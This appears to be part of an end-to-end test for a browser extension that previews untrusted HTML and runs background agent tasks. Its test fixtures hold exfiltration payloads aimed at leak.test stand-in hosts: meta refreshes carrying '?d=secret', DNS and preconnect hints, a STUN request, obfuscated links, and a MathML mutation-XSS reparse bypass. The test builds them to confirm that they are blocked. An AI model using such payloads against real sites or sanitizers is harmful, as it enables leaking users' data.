  // shadow-root one, markup a parse could bring back as one, a hint), and its links lead
  // nowhere (a followed link's host would be looked up first). The user can run a page
  // anyway, uncontained: then what it does may reach a host (another page here).
  const away = `<!doctype html><meta http-equiv="x-dns-prefetch-control" content="on"><meta http-equiv="refresh" content="1;url=http://refresh.leak.test/moved?d=secret">`
    + `<link rel="preconnect" href="http://preconnect-static.leak.test"><link rel="dns-prefetch" href="http://dnsprefetch-static.leak.test"><link rel="prerender" href="http://prerender-static.leak.test/">`
    + `<p>Leak</p><noscript><p id="fallback">Shown without scripts</p></noscript>`
    + `<iframe srcdoc="<meta http-equiv=refresh content='0;url=http://framed.leak.test/'>"></iframe>`
    + `<div><template shadowrootmode="open"><iframe srcdoc="<meta http-equiv=refresh content='0;url=http://shadow.leak.test/'>"></iframe></template></div>`
    + `<svg><style>&lt;meta http-equiv="refresh" content="0;url=http://style.leak.test/"&gt;</style><xmp>&lt;meta http-equiv="refresh" content="0;url=http://xmp.leak.test/"&gt;</xmp></svg>`
    + `<a href="http://link.leak.test/?d=secret" style="display:block;height:100vh">Away</a>`
    + `<script>parent.postMessage({ review: 'ran' }, '*'); new RTCPeerConnection({ iceServers: [{ urls: 'stun:script.leak.test:3478' }] }).createOffer();</script>`;
  const run = `<!doctype html><p>Run</p><script>parent.postMessage({ review: 'ran' }, '*'); const hint = document.createElement('link'); hint.rel = 'dns-prefetch'; hint.href = 'http://control.' + 'leak-control.test/'; document.head.append(hint);</script>`;
  const shutThread = await page.eval(`rpc('create', { provider: 'review', runner: 'none', text: 'pages where previews are not contained', files: [${[['away.html', away], ['run.html', run]].map(([path, text]) => `{ path: '${path}', bytes: new TextEncoder().encode(${JSON.stringify(text)}) }`).join(', ')}] })`);
  await settled(shutThread.id);
  const plain = await open(browser, 'about:blank');
  await browser.send('Network.enable', {}, plain.sessionId);
  await browser.send('Network.setBypassServiceWorker', { bypass: true }, plain.sessionId);
  const uncontained = async (path) => {
    await browser.send('Page.navigate', { url: `chrome-extension://${extension}/view.html?thread=${shutThread.id}&path=${path}` }, plain.sessionId);
    await plain.until(`document.querySelector('#view-reload') && true`, { what: `${path} in the uncontained tab` });
    await plain.eval(`globalThis.heard = []; addEventListener('message', ({ data }) => { if (data?.review) heard.push(data.review); })`);
    await plain.until(`!document.querySelector('#view-note').hidden && document.querySelector('#view-note button')?.textContent === 'Run them'`, { what: 'the note that its scripts wait' });
    assert.match(await plain.eval(`document.querySelector('#view-note').textContent`), /^Its scripts are off: this browser cannot keep a running page offline\. /);
  };
  await uncontained('away.html');
  // Links leave as the browser reads their address (tabs and control characters dropped),
  // and an SVG animation cannot set one back: none keeps an address to a host.
  const tricked = await plain.eval(`(async () => {
    const { pageOf } = await import('./page.mjs');
    const html = '<a href="ht\\ttps://tab.leak.test/">a</a><a href="\\u0001https://ctl.leak.test/">b</a>'
      + '<a href=" HTTPS://case.leak.test">c</a><a href="//ext.example/x">d</a><a href="#top">e</a>'
      + '<svg><a><set attributeName="href" to="https://set.leak.test/"/><text>f</text></a></svg>';
    const page = await pageOf({ path: 'x.html', files: [], read: async () => new Uint8Array(), html, contained: false });
    const doc = new DOMParser().parseFromString(page.html, 'text/html');
    return { hrefs: [...doc.querySelectorAll('a')].map((a) => a.getAttribute('href') ?? a.getAttribute('xlink:href')), sets: doc.querySelectorAll('set').length };
  })()`);
  assert.deepEqual(tricked, { hrefs: [null, null, null, '//ext.example/x', '#top', null], sets: 0 }, 'no link keeps a way out');
  // Markup that reads otherwise the second time (a form in MathML) is read again as the
  // frame will read it: nothing taken out comes back.
  const reread = await plain.eval(`(async () => {
    const { pageOf } = await import('./page.mjs');
    const html = '<form><math><mtext></form><form><mglyph><style></math><meta http-equiv="refresh" content="0;url=https://mx.leak.test/"><link rel="preconnect" href="https://mx.leak.test/"><a href="https://mx.leak.test/x">x</a>';
    const found = (text) => new DOMParser().parseFromString(text, 'text/html').querySelectorAll('meta[http-equiv="refresh"], link[rel="preconnect"], a[href^="https:"]').length;
    // Read once it holds none of them; written out and read again, it does.
    const revives = found(html) === 0 && found(new DOMParser().parseFromString(html, 'text/html').documentElement.outerHTML) > 0;
    const page = await pageOf({ path: 'x.html', files: [], read: async () => new Uint8Array(), html, contained: false });
    return { revives, kept: found(page.html) };
  })()`);
  assert.deepEqual(reread, { revives: true, kept: 0 }, 'what a second reading brings back is taken out');
  // Followed, its link goes nowhere; nothing else it holds goes anywhere either.
  const box = await plain.eval(`(() => { const r = document.querySelector('iframe#view').getBoundingClientRect(); return { x: r.x + 40, y: r.y + r.height - 40 }; })()`);
  for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased']) await browser.send('Input.dispatchMouseEvent', { type, x: box.x, y: box.y, button: 'left', clickCount: 1 }, plain.sessionId);
  await new Promise((done) => setTimeout(done, 2500));
  assert.deepEqual(await plain.eval('heard'), [], 'nothing ran before the user let it');
  assert.equal(await plain.eval(`document.querySelectorAll('iframe').length`), 1, 'its frames went with its scripts');
  await uncontained('run.html');
  await plain.click('#view-note button');
  await plain.until(`heard.includes('ran')`, { what: 'the page to run once let' });
  await plain.until(`document.querySelector('#view-note').textContent === 'Its scripts run, and this browser cannot keep them offline. Stop them'`, { what: 'the note that it runs uncontained' });
  await new Promise((done) => setTimeout(done, 500));
  await browser.send('Target.closeTarget', { targetId: plain.targetId }).catch(() => {});
  console.log('ok where previews cannot be contained, a page shows without its scripts, and nothing it holds (refreshes, hints, links) reaches a host; let run, it runs uncontained');

  // Tasks: switched on in the model sheet, a thread starts one in the background. Its
  // card below the step that started it says it works (what it does, Stop), as does the
  // line above the box, while the thread waits for it; its report shows as the task's,
  // and the turn ends.
  const last = (body) => JSON.parse(body).messages.at(-1);
  const said = (message) => JSON.stringify(message.content ?? '');
  let releaseChild;
  replies.push(
    { for: (body) => last(body).role === 'user' && said(last(body)).includes('TASKS-PARENT'), tool: 'task', input: { prompt: 'TASKS-CHILD look around', background: true } },
    { for: (body) => last(body).role === 'user' && said(last(body)).includes('TASKS-CHILD'), content: 'child done', hold: new Promise((done) => { releaseChild = done; }) },
    { for: (body) => last(body).role === 'tool' && body.includes('TASKS-PARENT'), content: 'waiting for it' },
    { for: (body) => last(body).role === 'user' && said(last(body)).includes('child done'), content: 'all done' },
  );
  await page.activate();
  await page.eval(`document.querySelector('#home').click()`);
  await page.eval(`chrome.permissions.request = async () => true`);
  await page.click('#model-chip');
  await page.until(`document.querySelector('#model-dialog').open`, { what: 'the model sheet' });
  assert.equal(await page.eval(`document.querySelector('#model-tasks').getAttribute('aria-checked')`), 'false', 'tasks are off by default');
  await page.click('#model-tasks');
  assert.match(await page.eval(`document.querySelector('#model-tasks').title`), /^On: it can start tasks/);
  await page.click('#model-apply');
  await page.until(`!document.querySelector('#model-dialog').open`);
  const picture = async (name) => {
    if (!shots) return;
    fs.mkdirSync(shots, { recursive: true });
    await new Promise((done) => setTimeout(done, 300));
    await page.screenshot(join(shots, name));
  };
  if (shots) await page.size(420, 820);
  await page.type('#prompt', 'TASKS-PARENT start a task');
  await page.click('#send');
  const tasked = await page.until(`spindlePanel.current && spindlePanel.threads.get(spindlePanel.current)?.tasks && spindlePanel.current`, { what: 'the thread with tasks on' });
  await page.until(`Boolean(document.querySelector('#history .task-block.working .task-stop:not([hidden])'))`, { what: 'the working task’s card, with Stop', timeout: 60_000 });
  const card = await page.eval(`(() => { const block = document.querySelector('#history .task-block'); return { title: block.querySelector('.task-title').textContent, chip: block.querySelector('.task-chip').textContent, under: block.parentElement.matches('.steps'), step: block.parentElement.querySelector('.tool[data-tool="task"] .tool-label').textContent }; })()`);
  assert.equal(card.title, 'TASKS-CHILD look around');
  assert.match(card.chip, /^(\d+ · )?\d+:\d\d$/, 'the card says its steps and how long it works');
  assert.ok(card.under, 'the card is below the step that started it');
  assert.equal(card.step, 'Started a task: TASKS-CHILD look around');
  assert.match(await page.eval(`document.querySelector('#task-chip').hidden ? '' : document.querySelector('#task-chip').title`), /^Task working: TASKS-CHILD look around/);
  assert.equal(await page.eval(`document.querySelector('#task-chip').textContent`), '1', 'the chip counts the tasks at work');
  assert.equal(await page.eval(`spindlePanel.threads.get('${tasked}').state`), 'running', 'the thread waits for its task');
  await page.until(`/^Waiting for its task/.test(document.querySelector('#phase').textContent)`, { what: 'the bar saying what the turn waits on' });
  assert.equal(await page.eval(`document.querySelector('#send').dataset.mode`), 'wait', 'Stop now stops the waiting');
  await picture('tasks-1-working.png');
  releaseChild();
  await settled(tasked);
  await page.until(`document.querySelector('#task-chip').hidden`, { what: 'the task chip gone once it reported' });
  assert.match(lastBody, /child done/, 'the report reached the thread');
  await page.until(`Boolean(document.querySelector('#history .task-block.done') && document.querySelector('#history .task-report.finished'))`, { what: 'the card done and its report shown as the task’s' });
  const reported = await page.eval(`(() => { const node = document.querySelector('#history .task-report'); return { title: node.querySelector('.task-title').textContent, text: node.querySelector('.message').textContent, mine: [...document.querySelectorAll('#history .message-wrap.user')].some((wrap) => wrap.textContent.includes('child done')) }; })()`);
  assert.deepEqual(reported, { title: 'TASKS-CHILD look around', text: 'child done', mine: false });
  if (shots) {
    await page.eval(`document.querySelector('#history .task-block').open = true; document.querySelector('#history .task-report').open = true`);
    await picture('tasks-2-done-and-report.png');
    await page.eval(`document.querySelector('#history .task-block').open = false; document.querySelector('#history .task-report').open = false`);
  }
  console.log('ok tasks: switched on, a background task shows working on its card (Stop) and the chip while the thread waits, and its report shows as the task’s');

  // Stop while the turn waits for its task frees the thread and leaves the task working;
  // stopped on its card, the task reports that it stopped, and Continue reads that in:
  // nothing waits for a person.
  replies.push(
    { for: (body) => last(body).role === 'user' && said(last(body)).includes('TASKS-AGAIN'), tool: 'task', input: { prompt: 'TASKS-SLOW keep going', background: true } },
    { for: (body) => last(body).role === 'user' && said(last(body)).includes('TASKS-SLOW'), content: 'never', hold: new Promise(() => {}) },
    { for: (body) => last(body).role === 'tool' && body.includes('TASKS-AGAIN'), content: 'waiting again' },
    { for: (body) => last(body).role === 'user' && said(last(body)).includes(': stopped]'), content: 'it stopped; going on' },
  );
  await page.type('#prompt', 'TASKS-AGAIN start another');
  await page.click('#send');
  await page.until(`document.querySelector('#send').dataset.mode === 'wait'`, { what: 'the turn waiting for its second task', timeout: 60_000 });
  await page.click('#send');
  await settled(tasked);
  await page.until(`!document.querySelector('#task-chip').hidden && document.querySelector('#task-chip').title.startsWith('Task working: TASKS-SLOW keep going')`, { what: 'the task still working once the thread stopped waiting' });
  assert.equal(await page.eval(`document.querySelector('#notice').hidden`), true, 'the thread is not stopped part way');
  await picture('tasks-3-stopped-waiting.png');
  await page.click('#history .task-block.working .task-stop');
  await page.until(`document.querySelector('#phase').textContent === 'A task’s report waits'`, { what: 'its report waiting for the next turn' });
  await page.until(`Boolean(document.querySelector('#history .task-block.stopped'))`, { what: 'its card saying it stopped' });
  await picture('tasks-4-report-waits.png');
  assert.equal(await page.eval(`document.querySelector('#status-go').textContent`), 'Continue');
  await page.click('#status-go');
  await page.until(`/it stopped; going on/.test(document.querySelector('#history').textContent)`, { what: 'Continue to read its report in' });
  await settled(tasked);
  assert.match(lastBody, /: stopped\]\\nIt stopped before it finished and gave no answer\./, 'the thread heard it stopped');
  await page.until(`Boolean(document.querySelector('#history .task-report.stopped')) && document.querySelector('#task-chip').hidden && document.querySelector('#status-go').hidden`, { what: 'its report shown as the task’s, and nothing left waiting' });
  await picture('tasks-5-stopped-report.png');
  await page.eval(`(() => { const choice = JSON.parse(localStorage.getItem('spindle-new') || '{}'); localStorage.setItem('spindle-new', JSON.stringify({ ...choice, tasks: false })); })()`);
  if (shots) await page.unsize();
  console.log('ok tasks: Stop while the thread waits frees it and the task goes on; a task stopped on its card reports so, and Continue reads that in');

  // A message with a screenshot sent while a turn runs waits above the box (Stop stays
  // the button) and goes as the next turn once that one ends.
  let release;
  replies.push({ for: 'hold this turn', content: 'held', hold: new Promise((done) => { release = done; }) });
  const holding = await rpc('create', { provider: 'review', runner: 'none', text: 'hold this turn' });
  await page.activate();
  await page.eval(`document.querySelector('#home').click()`);
  await page.click(`#threads .thread-row[data-id="${holding.id}"]`);
  await page.until(`spindlePanel.current === '${holding.id}' && spindlePanel.threads.get('${holding.id}')?.state === 'running'`, { what: 'the held turn running' });
  await page.eval(`chrome.permissions.request = async () => true; document.querySelector('#prompt').value = ''; for (const drop of document.querySelectorAll('#attached .chip button')) drop.click();`);
  const shot = join(work, 'shot.png');
  fs.writeFileSync(shot, Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]));
  await page.files('#attach-file', [shot]);
  await page.type('#prompt', 'look at this');
  assert.equal(await page.eval(`document.querySelector('#send').dataset.mode`), 'queue', 'the button says the files wait');
  replies.push({ for: 'look at this', content: 'seen' });
  const heldRequests = requests;
  await page.click('#send');
  await page.until(`!document.querySelector('#queued').hidden`, { what: 'the waiting message shown' });
  assert.match(await page.eval(`document.querySelector('#queued-text').textContent`), /^Goes when this turn ends: “look at this” with shot\.png$/);
  assert.equal(await page.eval(`document.querySelector('#send').dataset.mode`), 'stop', 'Stop stays one click away');
  assert.equal(requests, heldRequests, 'nothing sent while the turn runs');
  release();
  await page.until(`document.querySelector('#queued').hidden`, { what: 'the waiting message sent' });
  await settled(holding.id);
  assert.equal(requests, heldRequests + 1, 'the waiting message went once');
  assert.ok(lastBody.includes('look at this') && lastBody.includes('[Attached, in the workspace: shot.png (8 bytes)]'), 'with its screenshot');
  console.log('ok a message with a screenshot waits for the running turn, then goes');

  // Which names Chrome looked up, now its log is whole: none a preview tried, and (so the
  // log is known to hold them) the one a page let run uncontained did.
  await browser.close();
  const looked = new Set(fs.readFileSync(netLog, 'utf8').match(/[a-z0-9-]+\.leak(?:-control)?\.test/g) ?? []);
  assert.deepEqual([...looked].filter((name) => name.endsWith('.leak.test')), [], 'no preview looked a name up');
  assert.ok(looked.has('control.leak-control.test'), `the net log holds the names looked up: ${[...looked]}`);
  console.log('ok no preview looked a name up (the net log holds the one an uncontained page did)');
} finally {
  await browser?.close();
  server.close();
}
console.log('review-browser passed');
